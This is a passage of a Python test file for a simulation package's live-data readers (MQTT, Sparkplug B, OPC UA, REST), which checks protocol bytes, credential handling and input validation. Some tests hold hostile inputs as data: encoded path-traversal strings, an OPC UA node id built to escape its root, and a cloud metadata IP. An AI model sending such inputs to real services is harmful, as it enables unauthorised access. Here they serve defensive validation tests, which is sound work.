    """Wait, without guessing a delay, until *check()* holds."""
    import time

    deadline = time.monotonic() + seconds
    while not check() and time.monotonic() < deadline:
        time.sleep(0.02)
    assert check()


def test_the_packets_the_reader_sends_are_the_ones_the_specification_gives():
    """Literal bytes, worked out by hand from MQTT 3.1.1 sections 3.1 and 3.8."""
    from nagasim.readers import mqtt

    anonymous = _mqtt(1883)
    assert mqtt._connect_packet("naga-1", anonymous) == bytes.fromhex(
        "10 12 0004 4d515454 04 02 003c 0006 6e6167612d31")
    with_password = _mqtt(1883, username="twin", secret=netguard.Secret("pw"))
    assert mqtt._connect_packet("naga-1", with_password) == bytes.fromhex(
        "10 1c 0004 4d515454 04 c2 003c 0006 6e6167612d31 0004 7477696e 0002 7077")
    assert mqtt._subscribe_packet(1, ["a/b", "c/#"], 1) == bytes.fromhex(
        "82 0e 0001 0003 612f62 01 0003 632f23 01")
    assert mqtt._framed(0x30, b"x" * 321)[:3] == bytes.fromhex("30 c1 02")    # 321 = 65 + 2 * 128
    # The only packet types this module can build: no PUBLISH (3), no will, no session.
    assert {mqtt._CONNECT, mqtt._SUBSCRIBE, mqtt._PUBACK, mqtt._PINGREQ, mqtt._DISCONNECT} == {
        1, 8, 4, 12, 14}
    assert not [name for name in vars(mqtt) if "publish_packet" in name or "will" in name.lower()]


def test_a_published_value_is_seen_within_two_seconds_and_nothing_is_ever_published(broker):
    """The exit check of the package, against the scripted broker; and D71: after a whole
    session the broker has received a CONNECT, a SUBSCRIBE, PUBACKs and a DISCONNECT, and
    nothing else."""
    import time

    from nagasim import live

    plant = broker()
    with live.Feed([_topics("plant/+/speed\nplant/line1/state", payload="json", time="ts",
                            qos=1)], network=_policy(_mqtt(plant.port, root="plant/#"))) as feed:
        cursor = feed.changes("line").cursor
        assert plant.ready.wait(5)
        started = time.monotonic()
        plant.publish("plant/line1/speed", b"12.5")
        events, cursor = _until(feed, "line", 1, cursor, seconds=2.0)
        assert time.monotonic() - started < 2.0
        assert [(e.key, e.value, e.source_time) for e in events] == [("plant/line1/speed", 12.5, None)]

        plant.publish("plant/line1/state", b'{"state": "run", "count": 3, "ts": 1700000000, '
                                           b'"nested": {"x": 1}}', qos=1, packet_id=0x1234)
        events, cursor = _until(feed, "line", 2, cursor)
        assert [(e.key, e.value, e.source_time) for e in events] == [
            ("plant/line1/state/state", "run", 1.7e9), ("plant/line1/state/count", 3, 1.7e9)]
        assert feed.status("line")["channel"] == "plain"
    _eventually(lambda: (14, 0) in plant.packets)       # the DISCONNECT has arrived
    assert plant.subscribes == [[("plant/+/speed", 1), ("plant/line1/state", 1)]]
    connect = plant.connects[0]
    assert connect["flags"] == 0x02 and connect["keepalive"] == 60       # clean session, no will
    assert connect["fields"][0].startswith("naga-") and len(connect["fields"]) == 1
    assert sorted({kind for kind, _flags in plant.packets}) == [1, 4, 8, 14]


def test_a_filter_outside_the_root_is_refused_before_connecting(broker):
    from nagasim import live

    plant = broker()
    policy = _policy(_mqtt(plant.port, root="plant/line1/#"))
    for location in ("plant/#", "#", "+/line1/x", "plant/line2/speed", "$SYS/#", "plant",
                     "plant/line1/a#", "plant/line1/#/x", "plant/line1/a+/x", "", "plant/line1/\x00"):
        with live.Feed([_topics(location)], network=policy) as feed:
            with pytest.raises(sources.ReadError) as caught:
                feed.changes("line")
            assert caught.value.code == "E_DATA_SOURCE_LOCATION", location
    from nagasim.readers import mqtt

    for location in ("plant/line1/#", "plant/line1/speed", "plant/line1/+/x\nplant/line1/a/b/c",
                     "plant/line1"):                    # "a/#" matches "a" itself
        assert mqtt.check(_topics(location), policy.connections["line"])["filters"]
    exact = _mqtt(plant.port, root="plant/+/speed")
    assert mqtt.check(_topics("plant/line1/speed"), exact) and mqtt.check(_topics("plant/+/speed"), exact)
    with pytest.raises(sources.ReadError):
        mqtt.check(_topics("plant/line1/speed/x"), exact)
    with pytest.raises(sources.ReadError):
        mqtt.check(_topics("a/#", verify=False), exact)
    assert plant.connects == []


def test_a_password_goes_to_the_broker_only_over_tls_or_to_this_machine(broker, tls_files,
                                                                       plant_net):
    from nagasim import live

    secret = netguard.Secret("p4ss-Canary")
    plant = broker(tls=True)
    conn = _mqtt(plant.port, scheme="mqtts", host="plant.test", username="twin", secret=secret,
                 ca_file=tls_files[0])
    with live.Feed([_topics()], network=_policy(conn)) as feed:
        feed.changes("line")
        plant.publish("plant/x", b"1")
        _until(feed, "line", 1)
        assert feed.status("line")["channel"] == "tls"
    assert plant.connects[0]["flags"] == 0xC2
    assert plant.connects[0]["fields"][1:] == ["twin", "p4ss-Canary"]

    plant_net["broker.plant.test"] = ["10.20.0.8"]              # plain, and another machine
    with live.Feed([_topics()], network=_policy(_mqtt(1883, username="twin",
                                                      secret=secret))) as feed:
        feed.changes("line")
        _eventually(lambda: feed.status("line")["problem"])
        status = feed.status("line")
    assert status["state"] == "down" and "credential" in status["problem"]
    assert "Canary" not in json.dumps(status)


def test_the_mqtt_column_of_the_failure_matrix(broker, monkeypatch):
    """Reconnect with a clean session and a gap; a packet over the limit is passed over by
    its declared size and counted; a malformed packet drops the link; a payload that is not
    what was promised is dropped and counted and the link stays up."""
    from nagasim import live

    monkeypatch.setattr(live.random, "random", lambda: 0.0)
    plant = broker()
    conn = _mqtt(plant.port, limits=(("packet", 200),))
    with live.Feed([_topics(payload="json")], network=_policy(conn)) as feed:
        cursor = feed.changes("line").cursor
        plant.publish("plant/a", b"1")
        plant.publish("plant/big", b"9" * 5000)                 # over the 200 byte limit
        plant.publish("plant/b", b"not json")
        plant.publish("plant/c", b"[1, 2]")
        plant.publish("$SYS/x", b"1")
        plant.publish("plant/d", b"2")
        events, cursor = _until(feed, "line", 2, cursor)
        assert [(e.key, e.value) for e in events] == [("plant/a", 1), ("plant/d", 2)]
        assert feed.status("line")["dropped"] == {"oversize": 1, "payload": 2, "topic": 1}

        plant.drop()                                            # the broker goes away
        _eventually(lambda: feed.status("line")["state"] == "down")
        down = feed.changes("line", cursor)
        assert down.state == "down" and down.gap and "E_DATA_READ" in [p.code for p in down.problems]
        assert plant.ready.wait(5)                              # back after about a second
        plant.publish("plant/a", b"5")
        events, cursor = _until(feed, "line", 1, down.cursor)
        assert [(e.key, e.value) for e in events] == [("plant/a", 5)]
        assert len(plant.connects) == 2 and len(plant.subscribes) == 2
        assert plant.connects[0]["fields"] != plant.connects[1]["fields"]   # a new client id

        plant.raw(bytes([0x60, 0x02, 0x00, 0x01]))              # a PUBREL nobody asked for
        # One read of the status: the link is retried about a second later, and a second read
        # could already see it up again.
        _eventually(lambda: "unexpected packet" in (feed.status("line")["problem"] or ""))
        assert feed.status("line")["gaps"] == 2
        assert feed.changes("line", cursor).gap is True


def test_a_broker_that_refuses_is_a_coded_failure_that_names_no_secret(broker):
    from nagasim import live

    for plant, said in ((broker(connack=5), "refused the connection"),
                        (broker(suback=b"\x80"), "refused a subscription")):
        with live.Feed([_topics()], network=_policy(_mqtt(plant.port))) as feed:
            feed.changes("line")
            _eventually(lambda: feed.status("line")["problem"])
            got = feed.changes("line")
            assert got.state == "down" and said in got.problems[0].message
            with pytest.raises(sources.ReadError) as caught:
                feed.rows("line")
            assert caught.value.code == "E_DATA_READ"


def test_a_model_runs_on_what_the_broker_holds(broker, tmp_path):
    """The package's twin check, engine side: a binding reads a subscription once (it
    settles, then closes) and a run starts on the value, with its provenance."""
    from nagasim import api

    from conftest import chain, create, dispose, layout

    plant = broker()
    blocks = [create(max_arrivals=1), dispose()]
    doc = layout(blocks, chain(*blocks), simulation={"time_limit": 5, "warmup": 0,
                                                     "replications": 1, "time_unit": "minutes"})
    doc["data_sources"] = [_topics("plant/#", payload="json", settle=0.6)]
    doc["data_bindings"] = [{"name": "reps", "source": "line", "column": "value",
                             "filter": {"key": "plant/line1/shifts"}, "transform": "last",
                             "target": "simulation.replications"}]
    threading.Timer(0.1, lambda: (plant.publish("plant/line1/speed", b"12.5"),
                                  plant.publish("plant/line1/shifts", b"3"))).start()
    results = api.run_model(doc, bind_data=True, base_dir=tmp_path, run_length=5,
                            network=_policy(_mqtt(plant.port)))
    row = results["data_inputs"].iloc[0]
    assert (row["Value"], row["Kind"], row["Rows"], row["Problem"]) == ("3", "mqtt", 1, "")
    assert plant.subscribes == [[("plant/#", 0)]]


# ---------------------------------------------------------------- Sparkplug B
def _pb(number: int, value) -> bytes:
    """One protocol-buffers field, for building payloads by hand in these tests."""
    def varint(n):
        out = bytearray()
        while True:
            out.append(n & 0x7F | (0x80 if n > 0x7F else 0))
            n >>= 7
            if not n:
                return bytes(out)

    if isinstance(value, bytes):
        return varint(number << 3 | 2) + varint(len(value)) + value
    if isinstance(value, float):
        return varint(number << 3 | 1) + struct.pack("<d", value)
    return varint(number << 3) + varint(value)


def _metric(name=None, alias=None, datatype=None, **value) -> bytes:
    body = (_pb(1, name.encode()) if name else b"") + (_pb(2, alias) if alias is not None else b"")
    body += _pb(4, datatype) if datatype is not None else b""
    for field, number in (("int", 10), ("long", 11), ("double", 13), ("boolean", 14),
                          ("string", 15), ("bytes", 16), ("null", 7), ("ts", 3)):
        if field in value:
            body += _pb(number, value[field])
    return _pb(2, body)


def test_a_sparkplug_payload_is_decoded_from_its_bytes():
    """A literal payload, written out byte by byte from the Sparkplug B schema: timestamp
    1700000000000, one Int32 metric "Speed" with alias 1 and value -5, seq 3."""
    from nagasim.readers import sparkplug

    literal = bytes.fromhex(
        "08 80d095ffbc31"                       # 1: timestamp, varint 1700000000000
        "12 11"                                 # 2: a metric, 17 bytes
        "  0a 05 5370656564"                    #    1: name "Speed"
        "  10 01"                               #    2: alias 1
        "  20 03"                               #    4: datatype Int32
        "  50 fbffffff0f"                       #    10: int_value 4294967291 (-5)
        "18 03")                                # 3: seq 3
    timestamp, seq, metrics = sparkplug.decode(literal)
    assert (timestamp, seq) == (1_700_000_000_000, 3)
    assert metrics == [sparkplug.Metric("Speed", 1, None, 3, -5)]
    # ... and the test's own encoder writes those same bytes, so the fixtures below hold.
    assert _pb(1, 1_700_000_000_000) + _metric("Speed", 1, 3, int=4294967291) + _pb(3, 3) == literal

    kinds = sparkplug.decode(
        _metric("a", datatype=4, long=(1 << 64) - 2) + _metric("b", datatype=8, long=(1 << 64) - 2)
        + _metric("c", datatype=10, double=2.5) + _metric("d", datatype=11, boolean=1)
        + _metric("e", datatype=12, string=b"run") + _metric("f", datatype=3, null=1)
        + _metric("g", datatype=17, bytes=b"\x01\x02") + _pb(2, _pb(1, b"h") + bytes.fromhex("65 0000c03f"))
        + _pb(9, b"ignored") + _pb(4, b"uuid"))[2]
    assert [(m.name, m.value, m.skipped) for m in kinds] == [
        ("a", -2, False), ("b", (1 << 64) - 2, False), ("c", 2.5, False), ("d", True, False),
        ("e", "run", False), ("f", None, False), ("g", None, True), ("h", 1.5, False)]


@pytest.mark.parametrize("payload", [b"\x08", b"\x12\x05ab", b"\x12\x02\x0a\x09", b"\x0b",
                                     b"\x80" * 11 + b"\x01", b"\x12\x03\x65\x00\x00",
                                     _pb(2, b"") * 10_001],
                         ids=["a number cut short", "a metric longer than the payload",
                              "a name longer than its metric", "a group", "a number too long",
                              "a float cut short", "too many metrics"])
def test_a_malformed_sparkplug_payload_is_one_coded_error(payload):
    from nagasim.readers import sparkplug

    with pytest.raises(sources.ReadError) as caught:
        sparkplug.decode(payload)
    assert caught.value.code == "E_DATA_READ"


class _Sink:
    def __init__(self):
        self.values, self.counts, self.gaps = [], [], 0

    def accept(self, key, value, source_time=None):
        self.values.append((key, value, source_time))

    def count(self, reason, n=1):
        self.counts += [reason] * n

    def gap(self):
        self.gaps += 1


def test_sparkplug_births_data_and_deaths_become_states_and_no_rebirth_is_asked(broker):
    """Aliases come from the birth; a metric by alias with no birth seen is dropped and
    counted, never asked for (Matteo, 2026-10-08: a rebirth request is never sent); a jump
    in the node's sequence is a gap; a death is a state too."""
    from nagasim.readers import mqtt

    sink, state = _Sink(), {"aliases": {}, "seq": {}}
    options = {"payload": "sparkplug_b"}

    def send(topic, *parts, seq=None, ts=1_700_000_000_000):
        payload = _pb(1, ts) + b"".join(parts) + (_pb(3, seq) if seq is not None else b"")
        mqtt.deliver(topic, payload, options, sink, state)
        taken, sink.values = sink.values, []
        return taken

    # Data by alias before any birth: unresolved, counted, nothing delivered.
    assert send("spBv1.0/Plant1/NDATA/Edge1", _metric(alias=1, double=7.0), seq=9) == []
    assert sink.counts == ["unresolved"]
    born = send("spBv1.0/Plant1/NBIRTH/Edge1", _metric("Speed", 1, 10, double=1.5),
                _metric("Count", 2, 3, int=4294967295), _metric("bdSeq", datatype=8, long=0), seq=0)
    assert born == [("Plant1/Edge1", True, 1.7e9), ("Plant1/Edge1/Speed", 1.5, 1.7e9),
                    ("Plant1/Edge1/Count", -1, 1.7e9), ("Plant1/Edge1/bdSeq", 0, 1.7e9)]
    assert send("spBv1.0/Plant1/DBIRTH/Edge1/Press", _metric("Temp", 1, 10, double=20.0),
                seq=1)[1] == ("Plant1/Edge1/Press/Temp", 20.0, 1.7e9)
    # Data by alias: the name and the signed type come from the birth of that owner.
    assert send("spBv1.0/Plant1/NDATA/Edge1", _metric(alias=2, int=4294967294),
                _metric(alias=1, double=2.5, ts=1_700_000_001_500), seq=2) == [
        ("Plant1/Edge1/Count", -2, 1.7e9), ("Plant1/Edge1/Speed", 2.5, 1_700_000_001.5)]
    assert send("spBv1.0/Plant1/DDATA/Edge1/Press", _metric(alias=1, double=21.0), seq=3) == [
        ("Plant1/Edge1/Press/Temp", 21.0, 1.7e9)]
    assert sink.gaps == 0
    send("spBv1.0/Plant1/NDATA/Edge1", _metric(alias=1, double=3.0), seq=7)     # 4, 5, 6 missed
    assert sink.gaps == 1
    send("spBv1.0/Plant1/NDATA/Edge1", _metric(alias=1, double=3.0), seq=8)
    assert sink.gaps == 1
    # What is not for a reader: commands, host state, another namespace, a bad payload.
    for topic in ("spBv1.0/Plant1/NCMD/Edge1", "spBv1.0/STATE/host", "spAv1.0/Plant1/NDATA/Edge1",
                  "spBv1.0/Plant1/NDATA", "$SYS/broker"):
        assert send(topic, _metric(alias=1, double=1.0)) == []
    mqtt.deliver("spBv1.0/Plant1/NDATA/Edge1", b"\x12\x05ab", options, sink, state)
    assert sink.counts[1:] == ["topic"] * 5 + ["payload"]
    # A device's death, then the node's: states, and their aliases are forgotten.
    assert send("spBv1.0/Plant1/DDEATH/Edge1/Press", seq=9) == [("Plant1/Edge1/Press", False, 1.7e9)]
    assert send("spBv1.0/Plant1/NDEATH/Edge1", _metric("bdSeq", datatype=8, long=0)) == [
        ("Plant1/Edge1", False, 1.7e9)]
    assert state == {"aliases": {}, "seq": {}}
    assert send("spBv1.0/Plant1/NDATA/Edge1", _metric(alias=1, double=1.0), seq=1) == []

    # End to end: through the broker, and the broker never receives a PUBLISH (a rebirth
    # request is one: `spBv1.0/<group>/NCMD/<node>`).
    from nagasim import live

    plant = broker()
    with live.Feed([_topics("spBv1.0/Plant1/#", payload="sparkplug_b")],
                   network=_policy(_mqtt(plant.port, root="spBv1.0/Plant1/#"))) as feed:
        feed.changes("line")
        plant.publish("spBv1.0/Plant1/NDATA/Edge1", _pb(1, 1_700_000_000_000)
                      + _metric(alias=1, double=7.0) + _pb(3, 4))
        plant.publish("spBv1.0/Plant1/NBIRTH/Edge1", _pb(1, 1_700_000_000_000)
                      + _metric("Speed", 1, 10, double=1.5) + _pb(3, 0))
        events, _cursor = _until(feed, "line", 2)
        assert [(e.key, e.value) for e in events] == [("Plant1/Edge1", True),
                                                      ("Plant1/Edge1/Speed", 1.5)]
        assert feed.status("line")["dropped"] == {"unresolved": 1}
    assert 3 not in {kind for kind, _flags in plant.packets}


@pytest.mark.slow
def test_whatever_bytes_arrive_the_decoders_only_drop_and_count():
    """Fuzz (rule 10: everything read is data). Random bytes as a payload of each kind, on
    a random topic: `deliver` never raises, hands on only scalars, and `sparkplug.decode`
    fails only with its one coded error."""
    hypothesis = pytest.importorskip("hypothesis")
    from hypothesis import strategies as st

    from nagasim.readers import mqtt, sparkplug

    topics = st.one_of(st.text(max_size=40), st.sampled_from([
        "spBv1.0/G/NBIRTH/N", "spBv1.0/G/NDATA/N", "spBv1.0/G/DDATA/N/D", "spBv1.0/G/NDEATH/N"]))

    @hypothesis.settings(max_examples=300, deadline=None)
    @hypothesis.given(st.binary(max_size=400), topics, st.sampled_from(["json", "text", "sparkplug_b"]))
    def run(payload, topic, kind):
        sink = _Sink()
        mqtt.deliver(topic, payload, {"payload": kind, "time": "ts"}, sink, {"aliases": {}, "seq": {}})
        for key, value, moment in sink.values:
            assert isinstance(key, str) and isinstance(value, (bool, int, float, str, type(None)))
            assert moment is None or isinstance(moment, float)
        try:
            sparkplug.decode(payload)
        except sources.ReadError as exc:
            assert exc.code == "E_DATA_READ"

    run()


# ---------------------------------------------------------------- OPC UA (D223)
def _opcua(port, **fields) -> netguard.Connection:
    base = {"name": "press", "kind": "opcua", "scheme": "opc.tcp", "host": "press.plant.test",
            "port": port, "path": "/plant", "private": True}
    return netguard.Connection(**{**base, **fields})


def _nodes(location="ns=2;s=Press.Speed", **options) -> dict:
    return {"name": "press", "kind": "opcua", "connection": "press", "location": location,
            "options": {"settle": 0.5, **options}}


def test_opcua_node_ids_are_checked_before_anything_connects():
    from nagasim.readers import opcua

    conn = _opcua(4840, root="ns=2;s=Press.")
    assert opcua.check(_nodes("ns=2;s=Press.Speed\n\n  ns=2;s=Press.State "), conn) == {
        "interval_ms": 1000, "settle": 0.5, "nodes": ["ns=2;s=Press.Speed", "ns=2;s=Press.State"]}
    assert opcua.check(_nodes("i=2258"), _opcua(4840))["nodes"] == ["i=2258"]
    for location in ("", "Press.Speed", "ns=2;s=Oven.Temp", "ns=x;s=Press.Speed",
                     "opc.tcp://other/ns=2;s=Press.Speed", "ns=2;s=Press." + "x" * 1024,
                     "\n".join(["ns=2;s=Press.A"] * 1001)):
        with pytest.raises(sources.ReadError) as caught:
            opcua.check(_nodes(location), conn)
        assert caught.value.code == "E_DATA_SOURCE_LOCATION"
    for options in ({"interval_ms": 50}, {"interval_ms": "fast"}, {"browse": True}):
        with pytest.raises(sources.ReadError) as caught:
            opcua.check(_nodes(**options), conn)
        assert caught.value.code == "E_DATA_SOURCE_OPTION"
    # The only things this reader asks a session for (no write, call, history or browse).
    source = Path(opcua.__file__).read_text(encoding="utf-8")
    for call in ("write_value", "write_attribute", "call_method", "read_raw_history",
                 "get_children", "browse", "delete_nodes", "add_nodes"):
        assert f".{call}(" not in source, call


def test_an_opcua_source_without_the_extra_is_a_coded_failure_that_says_how_to_get_it(
        monkeypatch, plant_net):
    """`asyncua` is optional: without it the source is down with the install hint, and
    nothing was dialled (`plant_net` would fail the test)."""
    from nagasim import live

    monkeypatch.setitem(sys.modules, "asyncua", None)
    policy = _policy(_opcua(4840))
    with live.Feed([_nodes()], network=policy) as feed:
        feed.changes("press")
        _eventually(lambda: feed.status("press")["problem"])
        with pytest.raises(sources.ReadError) as caught:
            feed.rows("press")
    assert caught.value.code == "E_DATA_READ" and 'pip install "nagasim[opcua]"' in caught.value.hint
    resolved, report = databind.resolve_bindings(_live_model(_nodes(settle=0.1), column="value"),
                                                 None, network=policy)
    assert [p.code for p in report.problems] == ["E_DATA_READ"] and report.overrides == []


def test_an_opcua_password_needs_an_encrypted_channel_or_this_machine(plant_net, monkeypatch):
    """Matteo, 2026-10-08: a password over security None is refused, with no override. The
    refusal comes from the vetting, before the library is handed anything."""
    from nagasim.readers import opcua

    monkeypatch.setitem(sys.modules, "asyncua", types.ModuleType("asyncua"))
    monkeypatch.setattr(opcua.asyncio, "run", lambda coroutine: coroutine.close())
    plant_net["press.plant.test"] = ["10.20.0.15"]
    secret = netguard.Secret("p4ss-Canary")
    with pytest.raises(netguard.NetworkRefused) as caught:
        opcua.subscribe(_nodes(), _opcua(4840, username="twin", secret=secret), {}, None, None)
    assert caught.value.code == "E_DATA_PLAINTEXT_CREDENTIAL"
    opcua.subscribe(_nodes(), _opcua(4840), {}, None, None)             # anonymous: vetted
    plant_net["press.plant.test"] = ["127.0.0.1"]
    opcua.subscribe(_nodes(), _opcua(4840, username="twin", secret=secret), {}, None, None)
    plant_net["press.plant.test"] = ["169.254.169.254"]
    with pytest.raises(netguard.NetworkRefused):
        opcua.subscribe(_nodes(), _opcua(4840), {}, None, None)


def test_opcua_data_changes_arrive_as_states_from_a_server_in_this_process(plant_net):
    """Against `asyncua.Server` in process (skipped without the extra): a value within two
    seconds with the server's stamp, a later change, an array dropped and counted, and a
    server that goes away is a gap."""
    asyncua = pytest.importorskip("asyncua", reason="the optional extra nagasim[opcua] is not installed")
    import asyncio

    from nagasim import live

    started, done, found = threading.Event(), threading.Event(), {}

    async def serve():
        probe = socket.socket()
        probe.bind(("127.0.0.1", 0))
        found["port"] = probe.getsockname()[1]
        probe.close()
        server = asyncua.Server()
        await server.init()
        server.set_endpoint(f"opc.tcp://127.0.0.1:{found['port']}/plant")
        index = await server.register_namespace("urn:naga:test")
        found["index"] = index
        speed = await server.nodes.objects.add_variable(asyncua.ua.NodeId("Press.Speed", index),
                                                        "Speed", 12.5)
        await server.nodes.objects.add_variable(asyncua.ua.NodeId("Press.Curve", index),
                                                "Curve", [1.0, 2.0])
        async with server:
            started.set()
            while not done.is_set():
                if found.pop("write", None):
                    await speed.write_value(20.0)
                await asyncio.sleep(0.05)

    thread = threading.Thread(target=lambda: asyncio.run(serve()), daemon=True)
    thread.start()
    assert started.wait(10)
    index = found["index"]
    source = _nodes(f"ns={index};s=Press.Speed\nns={index};s=Press.Curve", interval_ms=100)
    try:
        with live.Feed([source], network=_policy(_opcua(found["port"]))) as feed:
            events, cursor = _until(feed, "press", 1, seconds=2.0)
            assert [(e.key, e.value) for e in events] == [(f"ns={index};s=Press.Speed", 12.5)]
            assert events[0].source_time is not None
            found["write"] = True
            events, cursor = _until(feed, "press", 1, cursor)
            assert events[0].value == 20.0
            assert feed.status("press")["dropped"] == {"type": 1}
            done.set()
            thread.join(10)
            _eventually(lambda: feed.status("press")["state"] == "down", seconds=15)
            assert feed.changes("press", cursor).gap is True
    finally:
        done.set()


# ---------------------------------------------------------------- OPC UA, fix round (I1, I2, M10)
def test_an_opcua_node_id_cannot_step_out_of_its_root_by_naming_a_second_id():
    """I2: `ns=2;i=5;ns=0;i=2258` is, to the library, node 2258 of namespace 0. An id has ONE
    identifier, and a root is compared by namespace, kind and value, not as a text prefix."""
    from nagasim.readers import opcua

    def allowed(root, *nodes):
        out = []
        for node in nodes:
            try:
                opcua.check(_nodes(node), _opcua(4840, root=root))
                out.append(node)
            except sources.ReadError as exc:
                assert exc.code == "E_DATA_SOURCE_LOCATION"
        return out

    guid = "ns=2;g=09087e75-8e5e-499b-954f-f2a9603db28a"
    assert allowed("ns=2;", "ns=2;i=5;ns=0;i=2258", "ns=2;i=5;s=x", "ns=2;b=YWJj;i=1", "ns=2;i=5",
                   "ns=0;i=2258", "i=2258", "ns=22;i=5", guid, "ns=2;s=a;b") == [
        "ns=2;i=5", guid, "ns=2;s=a;b"]                 # a string id may hold a semicolon
    assert allowed("ns=2;i=1", "ns=2;i=1", "ns=2;i=10", "ns=2;i=01", "ns=2;s=1", "i=1") == [
        "ns=2;i=1", "ns=2;i=01"]
    assert allowed(guid, guid, guid + "0", "ns=2;g=19087e75-8e5e-499b-954f-f2a9603db28a") == [guid]
    assert allowed("ns=2;s=Press.", "ns=2;s=Press.Speed", "ns=2;s=Oven", "s=Press.Speed",
                   "ns=2;i=5") == ["ns=2;s=Press.Speed"]
    assert allowed("", "i=2258", "ns=3;s=x") == ["i=2258", "ns=3;s=x"]
    assert allowed("Press", "ns=2;s=Press.Speed", "s=Press") == []      # not a root: nothing passes


class _Hello:
    """A stand-in for asyncua's Client whose server acknowledged (size, chunks)."""
    asked = []

    def __init__(self, url, timeout, agreed=(262_144, 5)):
        self.agreed = agreed
        self.uaclient = types.SimpleNamespace(protocol=None)

    async def connect(self):
        _Hello.asked.append((self.max_messagesize, self.max_chunkcount))
        if self.agreed is None:                     # a library that keeps its limits elsewhere
            return
        size, chunks = self.agreed
        limits = types.SimpleNamespace(max_message_size=size, max_chunk_count=chunks)
        self.uaclient.protocol = types.SimpleNamespace(_connection=types.SimpleNamespace(_limits=limits))

    def get_node(self, text):
        return types.SimpleNamespace(nodeid=asyncua_ua().NodeId.from_string(text))

    async def create_subscription(self, *args):
        raise RuntimeError("stop here")             # the session is open and was read

    async def disconnect(self):
        pass


def asyncua_ua():
    import asyncua
    return asyncua.ua


def _hello_session(monkeypatch, agreed):
    """Run `_session` against a client that acknowledges *agreed*; return the sink's warnings."""
    asyncua = pytest.importorskip("asyncua", reason="the optional extra nagasim[opcua] is not installed")
    import asyncio

    from nagasim.readers import opcua

    warned = []
    sink = types.SimpleNamespace(warn=lambda message, hint: warned.append((message, hint)))
    monkeypatch.setattr(asyncua, "Client", lambda url, timeout: _Hello(url, timeout, agreed))
    _Hello.asked.clear()
    with pytest.raises(sources.ReadError):          # `_Hello` ends the session after the warning
        asyncio.run(opcua._session("opc.tcp://127.0.0.1:4840", _opcua(4840),
                                   {"nodes": ["ns=2;i=5"], "interval_ms": 1000}, sink, None))
    return warned


def test_the_opcua_client_is_asked_for_the_connections_packet_limit(monkeypatch):
    """D223: the limit goes in through the public attributes, which the Hello carries."""
    assert _hello_session(monkeypatch, (262_144, 5)) == []      # acknowledged as asked: no warning
    assert _Hello.asked == [(262_144, 5)]                       # the packet limit, 4 chunks + 1


def test_an_opcua_server_that_refuses_the_message_limit_is_warned_once_and_still_read(monkeypatch):
    for agreed in ((0, 5), (262_144, 0), (4_194_304, 5), (262_144, 65)):
        warned = _hello_session(monkeypatch, agreed)
        assert len(warned) == 1 and "did not accept the message limit" in warned[0][0], agreed
    assert _hello_session(monkeypatch, (1_000, 2)) == []        # a lower limit is fine


def test_an_opcua_limit_that_cannot_be_read_back_is_said_and_is_not_a_failure(monkeypatch):
    from nagasim.readers import opcua

    assert opcua._agreed(types.SimpleNamespace(uaclient=types.SimpleNamespace())) is None
    (warning,) = _hello_session(monkeypatch, None)              # `None` has no size: unknown
    assert "cannot be confirmed" in warning[0]


# ---------------------------------------------------------------- fix round: REST (I3, G1, M4)
@pytest.mark.parametrize("location", [
    "orders/x%3F%2F..%2F..%2Fadmin",        # a decoded "?" used to end the check: /x?/../../admin
    "orders/x%253F%252F..%252F..%252Fadmin",
    "orders/..;/admin",                     # a path parameter some servers drop: /../admin
    "orders/..%3B/admin", "orders/..x/admin", "orders/x%23frag", "orders/a%3Fb"])
def test_a_rest_path_is_judged_whole_in_every_decoding(location, rest_plant):
    port, seen = rest_plant({})
    with pytest.raises(sources.ReadError) as caught:
        databind.read_rows(_orders_source(location=location), network=_policy(_rest(port, root="/orders")))
    assert caught.value.code == "E_DATA_SOURCE_LOCATION" and seen == []


def test_a_rest_query_is_still_a_query(rest_plant):
    port, seen = rest_plant({"/api/v2/orders?since=2026-10-08T06%3A00&q=a..b": _ORDERS[:1]})
    rows, _stamp = databind.read_rows(_orders_source(location="orders?since=2026-10-08T06%3A00&q=a..b"),
                                      network=_policy(_rest(port, root="/orders")))
    assert len(rows) == 1 and len(seen) == 1


def test_https_names_its_host_as_a_browser_would_and_never_dials_by_itself(rest_plant, tls_files,
                                                                          monkeypatch):
    """G1: over https the request line's Host has no ":443"; another port is still named. The
    socket is the pinned one: `http.client` connecting by itself would fail the test."""
    import http.client

    from nagasim.readers import rest

    port, seen = rest_plant({"/orders": _ORDERS}, tls=True)
    monkeypatch.setattr(http.client.HTTPConnection, "connect",
                        lambda self: pytest.fail("http.client dialled by itself"))
    monkeypatch.setattr(http.client.HTTPSConnection, "connect",
                        lambda self: pytest.fail("http.client dialled by itself"))
    there = _rest(port, scheme="https", host="plant.test", path="", ca_file=tls_files[0])
    assert len(databind.read_rows(_orders_source(), network=_policy(there))[0]) == 2
    assert seen[-1][2]["Host"] == f"plant.test:{port}"

    # The same service declared on 443: the pinned socket still goes to the fake's port.
    dial = netguard.open_connection
    monkeypatch.setattr(rest.netguard, "open_connection", lambda conn: dial(there))
    default = _rest(443, scheme="https", host="plant.test", path="", ca_file=tls_files[0])
    assert len(databind.read_rows(_orders_source(), network=_policy(default))[0]) == 2
    assert seen[-1][2]["Host"] == "plant.test"
    plain = _rest(80, host="plant.test", path="")
    port, seen = rest_plant({"/orders": _ORDERS})
    monkeypatch.setattr(rest.netguard, "open_connection",
                        lambda conn: dial(_rest(port, host="plant.test", path="")))
    assert len(databind.read_rows(_orders_source(), network=_policy(plain))[0]) == 2
    assert seen[-1][2]["Host"] == "plant.test"          # and port 80 over http likewise


def test_a_number_that_is_not_finite_is_not_data(rest_plant, tmp_path):
    """M4: NaN and 1e999 are valid to Python's JSON reader and to nothing after it."""
    body = b'[{"id": "a", "quantity": NaN, "hours": 1e999, "ok": 2}, {"id": "b", "quantity": -Infinity}]'
    port, _seen = rest_plant({"/api/v2/orders": (200, {}, body)})
    rows, _stamp = databind.read_rows(_orders_source(), network=_policy(_rest(port)))
    assert [{k: v for k, v in row.items() if v is not None} for row in rows] == [
        {"id": "a", "ok": 2}, {"id": "b"}]
    json.dumps(rows, allow_nan=False)


# ---------------------------------------------------------------- fix round: MQTT (I4, I5)
def test_sparkplug_state_stops_growing_at_the_connections_key_limit():
    """I4: aliases and sequence numbers are kept per node for as long as the link lives. A
    broker that announces node after node is counted and dropped at the `keys` limit."""
    from nagasim.readers import mqtt

    sink, state = _Sink(), {"aliases": {}, "seq": {}, "limit": 50}
    options = {"payload": "sparkplug_b"}
    for node in range(30):
        metrics = b"".join(_metric(f"m{n}", n, 10, double=1.0) for n in range(10))
        mqtt.deliver(f"spBv1.0/G/NBIRTH/N{node}", _pb(1, 1) + metrics + _pb(3, 0), options, sink, state)
